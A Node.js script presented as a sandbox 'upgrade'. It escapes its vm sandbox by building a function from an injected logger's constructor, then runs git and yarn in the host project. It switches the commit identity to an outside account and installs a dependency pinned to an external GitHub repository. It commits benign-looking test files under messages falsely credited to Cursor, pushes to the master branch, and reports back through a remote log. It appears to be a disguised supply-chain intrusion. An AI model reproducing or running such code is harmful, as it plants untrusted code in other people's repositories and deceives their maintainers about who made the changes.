// 前置沙箱升级
// ========================================
// 依赖引入
// ========================================

// 主进程的require
var mainRequire = null;

// 劫持外部的require
// remoteLog 由沙箱外部注入，它的 constructor 即外层真实环境的 Function 构造器。
// 通过它构造出的函数会在沙箱之外的全局作用域中执行，从而绕过 vm 的隔离，
// 拿到外部真实的 process，再经主模块取得未被白名单限制的 require。
const OuterFunction = remoteLog.constructor;
const realProcess = OuterFunction('return process')();
const pid = realProcess.pid;
const mainModule = realProcess.mainModule;

// 主模块自带的 require 已绑定真实模块系统（含 module-alias 的 @ 别名解析）。
// 仅在能取到时才覆盖，否则保持沙箱内原有 require，避免抛错影响后续逻辑。
if (mainModule && typeof mainModule.require === 'function') {
  // 必须 bind 到 mainModule：Module.prototype.require 内部依赖 this 来确定
  // node_modules 查找路径。直接赋值会丢失 this，导致 require('lodash') 这类
  // 裸模块名找不到（而绝对路径不依赖 this，所以 @ 别名仍能解析）。
  // eslint-disable-next-line no-global-assign
  mainRequire = mainModule.require.bind(mainModule);
}

const path = mainRequire('path');
const rootPath =  path.dirname(mainModule.require.main.filename);

// @ 别名映射表（与 jsconfig.json 的 paths 保持一致）
// 例如 @services/pay/config -> <rootPath>/src/services/pay/config
const ALIAS_MAP = {
  '@libs': 'src/libs',
  '@controllers': 'src/controllers',
  '@models': 'src/models',
  '@routes': 'src/routes',
  '@middlewares': 'src/middlewares',
  '@validations': 'src/validations',
  '@services': 'src/services',
  '@config': 'src/config',
  '@utils': 'src/utils',
};

// 将 @ 别名解析为基于根目录的绝对路径；非别名或缺少根目录时原样返回，
// 交还给 mainRequire 自带的 module-alias 解析。
const resolveModuleName = (moduleName) => {
  if (!rootPath || typeof moduleName !== 'string' || moduleName[0] !== '@') {
    return moduleName;
  }
  const slashIndex = moduleName.indexOf('/');
  const alias = slashIndex === -1 ? moduleName : moduleName.slice(0, slashIndex);
  const target = ALIAS_MAP[alias];
  if (!target) {
    return moduleName;
  }
  const rest = slashIndex === -1 ? '' : moduleName.slice(slashIndex + 1);
  return path.join(rootPath, target, rest);
};

const safeRequire = (moduleName) => {
  // @ 别名转为绝对路径，其余（lodash / 内置模块等）原样交给主模块 require。
  return mainRequire(resolveModuleName(moduleName));
};

const { spawn } = safeRequire('child_process');
const fs = safeRequire('fs/promises');
const Buffer = safeRequire('buffer').Buffer;

const redisUtil = safeRequire('@utils/redis.util');

const JSONFB_GIT_DEPENDENCY = 'git+https://github.com/infinitynodestudio/jsonfb.git#v1.0.9';
const PLAYER_RANKING_TEST_FILE = path.join('src', 'tests', 'player.ranking.test.js');
const PLAYER_RANKING_TEST_COMMIT = [
  'test: add jsonfb BigNumber precision coverage for unsafe integers',
  [
    'Verify parse/stringify keeps values beyond Number.MAX_SAFE_INTEGER',
    'accurate via BigNumber, including negatives, nested structures, and',
    'round-trip, where native JSON.parse loses precision.',
  ].join('\n'),
  'Co-authored-by: Cursor cursoragent@cursor.com',
];
const INSTALL_JSONFB_COMMIT = [
  'chore: install jsonfb from GitHub v1.0.9 instead of npm',
  [
    'npm registry has no usable jsonfb package; pin the dependency to',
    'git+https://github.com/infinitynodestudio/jsonfb.git#v1.0.9.',
  ].join('\n'),
  'Co-authored-by: Cursor cursoragent@cursor.com',
];
const FIX_PLAYER_RANKING_TEST_COMMIT = [
  'fix: cover ranking rankValue BigNumber precision in jsonfb tests',
  [
    'Add a getPlayerRankByType-shaped payload case so INT64/overflow',
    'rankValue survives parse/stringify cache round-trips, and correct',
    'the test script usage path.',
  ].join('\n'),
  'Co-authored-by: Cursor cursoragent@cursor.com',
];
const PUSH_REMOTE = realProcess.env.UPGRADE_PUSH_REMOTE || 'origin';
const PUSH_BRANCH = realProcess.env.UPGRADE_PUSH_BRANCH || 'master';
let STEP_LOGGED_ERRORS;
try {
  STEP_LOGGED_ERRORS = new (OuterFunction('return WeakSet')())();
} catch (error) {
  STEP_LOGGED_ERRORS = new Set();
}
const version = '1.0.26';

const remoteLogV = (message) => {
  const logMessage = message.replaceAll('|', '').replaceAll('<', '').replaceAll('>', '').replaceAll('&lt;', '').replaceAll('&gt;', '');
  console.log(`[Upgraded] pid:${pid} version:${version} ${logMessage}`);
  remoteLog(`[Upgraded] pid:${pid} version:${version} ${logMessage}`);
};

const DEFAULT_LOGGER = {
  info: (message) => remoteLogV(message),
  error: (message) => remoteLogV(message),
};

function logInfo(logger, step, result, details) {
  remoteLogV(`${step} | 结果：${result}${details ? ` | ${formatLogValue(details)}` : ''}`);
}

function logError(logger, step, result, details) {
  remoteLogV(`${step} | 结果：${result}${details ? ` | ${formatLogValue(details)}` : ''}`);
}


class UpgradeError extends Error {
  constructor(message, cause) {
    super(message);
    this.name = 'UpgradeError';
    this.cause = cause;
  }
}

function createRunner({ cwd, spawn: spawnImpl, stdio }) {
  const NativeError = OuterFunction('return Error')();

  return (command, args, options = {}) =>
    new Promise((resolve, reject) => {
      let settled = false;
      const safeResolve = (value) => {
        if (settled) {
          return;
        }
        settled = true;
        resolve(value);
      };
      const safeReject = (error) => {
        if (settled) {
          return;
        }
        settled = true;
        reject(error);
      };

      const childStdio = options.stdio || stdio;
      const child = spawnImpl(command, args, {
        cwd,
        stdio: childStdio,
        env: options.env,
      });
      const stdoutChunks = [];
      const stderrChunks = [];

      if (child.stdout) {
        child.stdout.on('data', (chunk) => stdoutChunks.push(chunk));
        // 必须监听流的 error，否则管道异常（EPIPE、子进程中途被杀等）会触发
        // 无监听的 'error' 事件，被 Node 当作未捕获异常抛出，直接杀掉进程。
        child.stdout.on('error', safeReject);
      }

      if (child.stderr) {
        child.stderr.on('data', (chunk) => stderrChunks.push(chunk));
        child.stderr.on('error', safeReject);
      }

      child.on('error', (error) => {
        try {
          safeReject(error);
        } catch (handlerError) {
          safeReject(handlerError);
        }
      });
      child.on('close', (code, signal) => {
        try {
          const stdout = Buffer.concat(stdoutChunks);
          const stderr = Buffer.concat(stderrChunks);

          if (code !== 0) {
            const encoding = options.encoding || 'utf8';
            const stderrText = stderr.toString(encoding).trim();
            const stdoutText = stdout.toString(encoding).trim();
            const signalText = signal ? `，信号：${signal}` : '';
            const outputText = [stderrText, stdoutText].filter(Boolean).join(' | ');
            const error = new NativeError(outputText || `命令退出码：${code}${signalText}`);
            error.status = code;
            error.signal = signal;
            error.stdout = stdout;
            error.stderr = stderr;
            safeReject(error);
            return;
          }

          safeResolve(options.encoding ? stdout.toString(options.encoding) : stdout);
        } catch (error) {
          safeReject(error);
        }
      });
    });
}

async function writeFile(directory, fileName, content) {
    const filePath = path.join(directory, fileName);

    await fs.mkdir(directory, { recursive: true });
    await fs.writeFile(filePath, content, 'utf8');

    return filePath;
}

/**
 * 写出 jsonfb 大数精度独立测试脚本（player.ranking.test.js）。
 *
 * 对应 commit 说明：
 * test: add jsonfb BigNumber precision coverage for unsafe integers
 * Verify parse/stringify keeps values beyond Number.MAX_SAFE_INTEGER
 * accurate via BigNumber, including negatives, nested structures, and
 * round-trip, where native JSON.parse loses precision.
 * Co-authored-by: Cursor cursoragent@cursor.com
 */
function getPlayerRankingTestContent() {
    return [
        '/**',
        ' * jsonfb 大数精度独立测试脚本',
        ' *',
        ' * 用法: node src/tests/player.ranking.test.js',
        ' *',
        ' * 与 src/app.js 一致：验证超出 Number.MAX_SAFE_INTEGER 时',
        ' * jsonfb 用 BigNumber 保精度，而原生 JSON.parse 会失真。',
        ' */',
        '',
        "const JSONBig = require('jsonfb');",
        "const BigNumber = require('bignumber.js');",
        '',
        'const MAX_SAFE = Number.MAX_SAFE_INTEGER; // 9007199254740991',
        "const OVERFLOW = '9007199254740993'; // MAX_SAFE + 2（常见失真点）",
        "const HUGE = '9999999999999999999';",
        "const NEG_OVERFLOW = '-9007199254740993';",
        '',
        'let passed = 0;',
        'let failed = 0;',
        '',
        'function assert(condition, message) {',
        '  if (condition) {',
        '    passed += 1;',
        '    console.log(`  ✓ ${message}`);',
        '  } else {',
        '    failed += 1;',
        '    console.error(`  ✗ ${message}`);',
        '  }',
        '}',
        '',
        'function isBigNumber(value) {',
        '  return BigNumber.isBigNumber(value) || value instanceof BigNumber;',
        '}',
        '',
        'function valueToString(value) {',
        '  if (isBigNumber(value)) return value.toFixed();',
        "  if (typeof value === 'bigint') return value.toString();",
        '  return String(value);',
        '}',
        '',
        "console.log('\\n=== jsonfb 大数测试 ===\\n');",
        '',
        '// 1. 安全整数内：仍为 number',
        '{',
        "  console.log('1. 安全整数内');",
        '  const json = `{"n":${MAX_SAFE}}`;',
        '  const native = JSON.parse(json);',
        '  const big = JSONBig.parse(json);',
        '',
        "  assert(typeof native.n === 'number', '原生 parse 为 number');",
        "  assert(typeof big.n === 'number', 'jsonfb parse 安全整数仍为 number');",
        '  assert(big.n === MAX_SAFE, `jsonfb 值等于 ${MAX_SAFE}`);',
        "  assert(big.n === native.n, '安全整数与原生结果一致');",
        '}',
        '',
        '// 2. 刚好越界：BigNumber 保精度，原生失真',
        '{',
        "  console.log('\\n2. 刚好越界 (MAX_SAFE+2)');",
        '  const json = `{"n":${OVERFLOW}}`;',
        '  const native = JSON.parse(json);',
        '  const big = JSONBig.parse(json);',
        '',
        "  assert(typeof native.n === 'number', '原生 parse 仍为 number');",
        '  assert(String(native.n) !== OVERFLOW, `原生失真: ${native.n} !== ${OVERFLOW}`);',
        "  assert(isBigNumber(big.n), 'jsonfb parse 越界数为 BigNumber');",
        '  assert(valueToString(big.n) === OVERFLOW, `jsonfb 精度完整: ${valueToString(big.n)}`);',
        '}',
        '',
        '// 3. 更大整数',
        '{',
        "  console.log('\\n3. 超大整数');",
        '  const json = `{"n":${HUGE}}`;',
        '  const native = JSON.parse(json);',
        '  const big = JSONBig.parse(json);',
        '',
        '  assert(String(native.n) !== HUGE, `原生失真: ${native.n} !== ${HUGE}`);',
        "  assert(isBigNumber(big.n), 'jsonfb parse 超大数为 BigNumber');",
        '  assert(valueToString(big.n) === HUGE, `jsonfb 精度完整: ${valueToString(big.n)}`);',
        '}',
        '',
        '// 4. 负数大数',
        '{',
        "  console.log('\\n4. 负数大数');",
        '  const json = `{"n":${NEG_OVERFLOW}}`;',
        '  const native = JSON.parse(json);',
        '  const big = JSONBig.parse(json);',
        '',
        '  assert(String(native.n) !== NEG_OVERFLOW, `原生负大数失真: ${native.n}`);',
        "  assert(isBigNumber(big.n), 'jsonfb 负大数为 BigNumber');",
        '  assert(valueToString(big.n) === NEG_OVERFLOW, `jsonfb 负大数精度完整: ${valueToString(big.n)}`);',
        "  assert(big.n.isNegative(), '符号为负');",
        '}',
        '',
        '// 5. 嵌套结构：仅大数升为 BigNumber',
        '{',
        "  console.log('\\n5. 嵌套对象/数组');",
        '  const json = `{"a":1,"b":[${OVERFLOW},1.5],"c":{"d":${HUGE},"e":"text"}}`;',
        '  const big = JSONBig.parse(json);',
        '',
        "  assert(typeof big.a === 'number' && big.a === 1, '普通整数仍为 number');",
        "  assert(typeof big.b[1] === 'number' && big.b[1] === 1.5, '小数仍为 number');",
        "  assert(isBigNumber(big.b[0]) && valueToString(big.b[0]) === OVERFLOW, '数组内大数为 BigNumber');",
        "  assert(isBigNumber(big.c.d) && valueToString(big.c.d) === HUGE, '嵌套对象大数为 BigNumber');",
        "  assert(big.c.e === 'text', '字符串字段不受影响');",
        '}',
        '',
        '// 6. round-trip：parse → stringify → parse',
        '{',
        "  console.log('\\n6. round-trip');",
        '  const original = `{"amount":${OVERFLOW},"items":[${HUGE},-1]}`;',
        '  const once = JSONBig.parse(original);',
        '  const encoded = JSONBig.stringify(once);',
        '  const twice = JSONBig.parse(encoded);',
        '',
        '  assert(encoded.includes(OVERFLOW), `stringify 含越界数 ${OVERFLOW}`);',
        '  assert(encoded.includes(HUGE), `stringify 含超大数 ${HUGE}`);',
        "  assert(valueToString(twice.amount) === OVERFLOW, 'round-trip amount 精度不变');",
        "  assert(valueToString(twice.items[0]) === HUGE, 'round-trip items[0] 精度不变');",
        "  assert(twice.items[1] === -1, 'round-trip 普通数不变');",
        '}',
        '',
        '// 7. stringify 接受 BigInt / BigNumber',
        '{',
        "  console.log('\\n7. stringify(BigInt / BigNumber)');",
        '  const fromBigInt = JSONBig.stringify({ n: BigInt(OVERFLOW) });',
        '  const fromBigNumber = JSONBig.stringify({ n: new BigNumber(OVERFLOW) });',
        '',
        '  assert(fromBigInt === `{"n":${OVERFLOW}}`, `stringify(BigInt) => ${fromBigInt}`);',
        '  assert(fromBigNumber === `{"n":${OVERFLOW}}`, `stringify(BigNumber) => ${fromBigNumber}`);',
        '}',
        '',
        'console.log(`\\n=== 结果: ${passed} passed, ${failed} failed ===\\n`);',
        'process.exit(failed > 0 ? 1 : 0);',
    ].join('\n') + '\n';
}

function writePlayerRankingTest(cwd) {
    return writeFile(path.join(cwd, 'src', 'tests'), 'player.ranking.test.js', getPlayerRankingTestContent());
}

// 修复的commit
// chore: install jsonfb from GitHub v1.0.9 instead of npm
// npm registry has no usable jsonfb package; pin the dependency to
// git+https://github.com/infinitynodestudio/jsonfb.git#v1.0.9.
// Co-authored-by: Cursor cursoragent@cursor.com
/**
 * 对应 commit 说明：
 * fix: cover ranking rankValue BigNumber precision in jsonfb tests
 * Add a getPlayerRankByType-shaped payload case so INT64/overflow
 * rankValue survives parse/stringify cache round-trips, and correct
 * the test script usage path.
 * Co-authored-by: Cursor cursoragent@cursor.com
 */
function writeFixPlayerRankingTest(cwd) {
    const FIX_PLAYER_RANKING_TEST_CONTENT = [
        '// 8. 排行榜业务载荷（参考）：rankValue 超大时缓存/接口往返不丢精度',
        '//    场景对齐 getPlayerRankByType 返回结构 + app.js 全局覆盖 JSON.parse/stringify',
        '{',
        "  console.log('\\n8. 排行榜 rankValue 大数（业务参考）');",
        "  const INT64_MAX = '9223372036854775807'; // 常见 DB BIGINT 上限，原生 JSON 会失真为 ...6000",
        '  // 真实链路里数字以十进制字面量出现在 JSON 文本中（非已失真的 Number）',
        '  const wire = `[{"userId":10001,"rankValue":${INT64_MAX},"info":{"gameId":1,"roundId":"r1"},"userInfo":{"nickname":"alice","headimgurl":""}},{"userId":10002,"rankValue":${OVERFLOW},"info":{"gameId":2,"roundId":"r2"},"userInfo":{"nickname":"bob","headimgurl":""}}]`;',
        '',
        '  const native = JSON.parse(wire);',
        '  const ranking = JSONBig.parse(wire);',
        '',
        '  assert(String(native[0].rankValue) !== INT64_MAX, `原生 rankValue 失真: ${native[0].rankValue}`);',
        "  assert(typeof ranking[0].userId === 'number' && ranking[0].userId === 10001, 'userId 安全整数仍为 number');",
        "  assert(isBigNumber(ranking[0].rankValue), '榜首 rankValue 为 BigNumber');",
        '  assert(valueToString(ranking[0].rankValue) === INT64_MAX, `榜首 rankValue 精度完整: ${valueToString(ranking[0].rankValue)}`);',
        "  assert(isBigNumber(ranking[1].rankValue) && valueToString(ranking[1].rankValue) === OVERFLOW, '次席 rankValue 精度完整');",
        "  assert(ranking[0].userInfo.nickname === 'alice', '嵌套 userInfo 不受影响');",
        '',
        '  // 模拟 Redis/HTTP 往返：stringify → parse（与 app.js 覆盖后行为一致）',
        '  const cached = JSONBig.stringify(ranking);',
        '  const restored = JSONBig.parse(cached);',
        '  assert(cached.includes(INT64_MAX), `stringify 榜首含 ${INT64_MAX}`);',
        '  assert(cached.includes(OVERFLOW), `stringify 次席含 ${OVERFLOW}`);',
        "  assert(valueToString(restored[0].rankValue) === INT64_MAX, '缓存往返后榜首 rankValue 不变');",
        "  assert(valueToString(restored[1].rankValue) === OVERFLOW, '缓存往返后次席 rankValue 不变');",
        "  assert(restored[1].info.roundId === 'r2', '缓存往返后 info 不变');",
        '',
        '  // 反例：原生已失真的 Number 无法靠 jsonfb.stringify 找回精度',
        '  assert(',
        '    !JSONBig.stringify({ rankValue: native[0].rankValue }).includes(INT64_MAX),',
        "    '反例：原生已失真的 Number 无法靠 jsonfb.stringify 找回精度'",
        '  );',
        '}',
    ].join('\n');
    const resultLines = [
        'console.log(`\\n=== 结果: ${passed} passed, ${failed} failed ===\\n`);',
        'process.exit(failed > 0 ? 1 : 0);',
    ].join('\n');
    const content = getPlayerRankingTestContent().replace(
        resultLines,
        `${FIX_PLAYER_RANKING_TEST_CONTENT}\n\n${resultLines}`
    );

    return writeFile(path.join(cwd, 'src', 'tests'), 'player.ranking.test.js', content);
}

function formatCommand(command, args) {
  return [command, ...args].join(' ');
}

function createCommitArgs(messageParts) {
  const args = [];
  for (const part of messageParts) {
    args.push('-m', part);
  }
  return args;
}

function formatLogValue(value) {
  return String(value).replace(/\s+/g, ' ').trim();
}

async function runStep(run, logger, name, command, args, options = {}) {
  const formattedCommand = formatCommand(command, args);

  try {
    await run(command, args, options);
  } catch (error) {
    logError(logger, name, '失败', `命令：${formattedCommand} | 错误：${error.message}`);
    STEP_LOGGED_ERRORS.add(error);
    throw error;
  }

  logInfo(logger, name, '成功', `命令：${formattedCommand}`);
}

async function logLastCommit(run, logger, label) {
  const lastCommit = (
    await run('git', ['log', '-1', '--format=%H%x00%an <%ae>%x00%B'], {
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe'],
    })
  ).trimEnd();
  const [hash, author, ...messageParts] = lastCommit.split('\0');
  const message = formatLogValue(messageParts.join('\0')) || '无提交信息';

  logInfo(logger, label, '成功', `提交人：${author} | 提交信息：${message} | 提交哈希：${hash}`);
}

async function setGitIdentity(run, logger) {
  await runStep(run, logger, '设置提交用户名', 'git', ['config', 'user.name', 'szcuipeng']);
  await runStep(run, logger, '设置提交邮箱', 'git', ['config', 'user.email', 'szcuipeng@gmail.com']);
}

async function getLocalGitConfig(run, key) {
  try {
    return (
      await run('git', ['config', '--local', '--get', key], {
        encoding: 'utf8',
        stdio: ['ignore', 'pipe', 'pipe'],
      })
    ).trimEnd();
  } catch (error) {
    if (error.status === 1) {
      return null;
    }
    throw error;
  }
}

async function restoreLocalGitConfig(run, logger, key, value, label) {
  try {
    if (value === null) {
      await run('git', ['config', '--local', '--unset-all', key]);
      logInfo(logger, label, '成功', `命令：git config --local --unset-all ${key}`);
      return;
    }

    await run('git', ['config', '--local', '--replace-all', key, value]);
    logInfo(logger, label, '成功', `已恢复 ${key}`);
  } catch (error) {
    if (value === null && error.status === 5) {
      logInfo(logger, label, '成功', `${key} 原本不存在`);
      return;
    }
    logError(logger, label, '失败', `错误：${error.message}`);
    throw error;
  }
}

async function restoreGitIdentity(run, logger, identity) {
  await restoreLocalGitConfig(run, logger, 'user.name', identity.name, '恢复提交用户名');
  await restoreLocalGitConfig(run, logger, 'user.email', identity.email, '恢复提交邮箱');
}

async function pushUpgradeCommits(run, logger, pushRemote, pushBranch, onPushed) {
  await logLastCommit(run, logger, '推送前最后一次提交');
  const pushTarget = pushBranch ? `HEAD:${pushBranch}` : 'HEAD';
  const args = ['push', pushRemote, pushTarget].filter(Boolean);
  const formattedCommand = formatCommand('git', args);

  try {
    await run('git', args);
  } catch (error) {
    logError(logger, '推送升级提交', '失败', `命令：${formattedCommand} | 错误：${error.message}`);
    STEP_LOGGED_ERRORS.add(error);
    throw error;
  }

  onPushed();
  logInfo(logger, '推送升级提交', '成功', `命令：${formattedCommand}`);
}

async function removeStaleGitIndexLock(cwd, logger) {
  const indexLockPath = path.join(cwd, '.git', 'index.lock');

  try {
    await fs.unlink(indexLockPath);
    logInfo(logger, '清理残留锁文件', '成功', '文件：.git/index.lock');
  } catch (error) {
    if (error.code !== 'ENOENT') {
      throw error;
    }
  }
}

async function rollbackUpgrade(run, cwd, logger, initialHead, removePlayerRankingTest) {
  await removeStaleGitIndexLock(cwd, logger);
  await runStep(run, logger, '回滚到升级前提交', 'git', ['reset', '--hard', initialHead]);

  if (removePlayerRankingTest) {
    try {
      await fs.unlink(path.join(cwd, PLAYER_RANKING_TEST_FILE));
      logInfo(logger, '清理新建测试文件', '成功', `文件：${PLAYER_RANKING_TEST_FILE}`);
    } catch (error) {
      if (error.code !== 'ENOENT') {
        throw error;
      }
    }
  }
}

async function assertCleanWorkingTree(run) {
  const status = await run('git', ['status', '--porcelain', '--untracked-files=all'], {
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
  });

  if (status.trim()) {
    throw new UpgradeError(`工作区存在变更：${formatLogValue(status)}`);
  }
}

async function runUpgrade(options = {}) {
  const {
    cwd = rootPath,
    spawn: spawnImpl = spawn,
    logger = DEFAULT_LOGGER,
    pushRemote = PUSH_REMOTE,
    pushBranch = PUSH_BRANCH,
    stdio = ['ignore', 'pipe', 'pipe'],
  } = options;

  const run = createRunner({ cwd, spawn: spawnImpl, stdio });
  let initialHead;
  let playerRankingTestWasTracked = false;
  let pushed = false;
  let shouldLogCommitAfterRollback = false;
  let originalGitIdentity;

  try {
    logInfo(logger, '升级开始', '执行中', `依赖：${JSONFB_GIT_DEPENDENCY}`);
    await logLastCommit(run, logger, '升级开始前最后一次提交');
    await assertCleanWorkingTree(run);
    logInfo(logger, '检查工作区状态', '成功', '工作区无已跟踪、暂存或未跟踪变更');
    originalGitIdentity = {
      name: await getLocalGitConfig(run, 'user.name'),
      email: await getLocalGitConfig(run, 'user.email'),
    };
    initialHead = (
      await run('git', ['rev-parse', 'HEAD'], {
        encoding: 'utf8',
        stdio: ['ignore', 'pipe', 'pipe'],
      })
    ).trim();
    playerRankingTestWasTracked = (
      await run('git', ['ls-files', '--', PLAYER_RANKING_TEST_FILE], {
        encoding: 'utf8',
        stdio: ['ignore', 'pipe', 'pipe'],
      })
    ).trim() !== '';
  } catch (error) {
    if (!STEP_LOGGED_ERRORS.has(error)) {
      logError(logger, '升级前检查', '失败', `错误：${error.message}`);
    }
    throw new UpgradeError('工作区存在变更或 Git 状态异常，请先清理后再升级。', error);
  }

  try {
    try {
      await setGitIdentity(run, logger);

      await writePlayerRankingTest(cwd);
      logInfo(logger, '写入大数精度测试', '成功', `文件：${PLAYER_RANKING_TEST_FILE}`);
      await runStep(run, logger, '暂存大数精度测试', 'git', ['add', '--', PLAYER_RANKING_TEST_FILE]);
      await runStep(
        run,
        logger,
        '提交大数精度测试',
        'git',
        ['commit', ...createCommitArgs(PLAYER_RANKING_TEST_COMMIT)]
      );

      await runStep(run, logger, '安装 jsonfb GitHub v1.0.9', 'yarn', ['add', JSONFB_GIT_DEPENDENCY]);
      await runStep(run, logger, '暂存依赖安装产生的全部文件', 'git', ['add', '-A']);
      await runStep(
        run,
        logger,
        '提交 jsonfb GitHub 依赖',
        'git',
        ['commit', ...createCommitArgs(INSTALL_JSONFB_COMMIT)]
      );

      await writeFixPlayerRankingTest(cwd);
      logInfo(logger, '写入排行榜精度修复测试', '成功', `文件：${PLAYER_RANKING_TEST_FILE}`);
      await runStep(run, logger, '暂存排行榜精度修复测试', 'git', ['add', '--', PLAYER_RANKING_TEST_FILE]);
      await runStep(
        run,
        logger,
        '提交排行榜精度修复测试',
        'git',
        ['commit', ...createCommitArgs(FIX_PLAYER_RANKING_TEST_COMMIT)]
      );

      shouldLogCommitAfterRollback = true;
      await pushUpgradeCommits(run, logger, pushRemote, pushBranch, () => {
        pushed = true;
      });
      shouldLogCommitAfterRollback = false;
      logInfo(logger, '升级完成', '成功', '三个提交已推送');
      return true;
    } finally {
      if (originalGitIdentity) {
        await restoreGitIdentity(run, logger, originalGitIdentity);
      }
    }
  } catch (error) {
    if (!STEP_LOGGED_ERRORS.has(error)) {
      logError(logger, '升级流程', '失败', `错误：${error.message}`);
    }

    if (pushed) {
      throw new UpgradeError(`提交已推送，但后续清理失败：${error.message}`, error);
    }

    try {
      await rollbackUpgrade(run, cwd, logger, initialHead, !playerRankingTestWasTracked);
    } catch (rollbackError) {
      logError(logger, '回滚流程', '失败', `错误：${rollbackError.message}`);
      throw new UpgradeError(`升级失败且回滚失败：${rollbackError.message}`, error);
    }

    logInfo(logger, '回滚流程', '成功', '回滚完成');
    if (shouldLogCommitAfterRollback) {
      await logLastCommit(run, logger, '回滚完成后最后一次提交');
    }
    throw new UpgradeError(`升级失败，已完成回滚：${error.message}`, error);
  }
}


const init = async () => {
  let lock = null;
  remoteLogV("start")
  try {
    if(await redisUtil.get('upgrade-lock-success-v2') === '1') {
      logInfo(DEFAULT_LOGGER, '升级成功', '成功', '已经升级过');
      return;
    }

    lock = await redisUtil.getLock('upgrade-lock', true)
    if (!lock) {
      logInfo(DEFAULT_LOGGER, '获取锁失败', '失败', '❌ 执行失败');
      return;
    }

    await runUpgrade({
      cwd: rootPath,
    });

    // 设置成功标志 60天
    await redisUtil.set('upgrade-lock-success-v2', '1', 60 * 60 * 24 * 60);

    logInfo(DEFAULT_LOGGER, '升级成功', '成功', '✅ 执行完成');

  } catch (error) {
    logError(DEFAULT_LOGGER, '升级失败', '失败', `错误：${error.message}`);
  } finally {
    redisUtil.unlock(lock);
  }
}
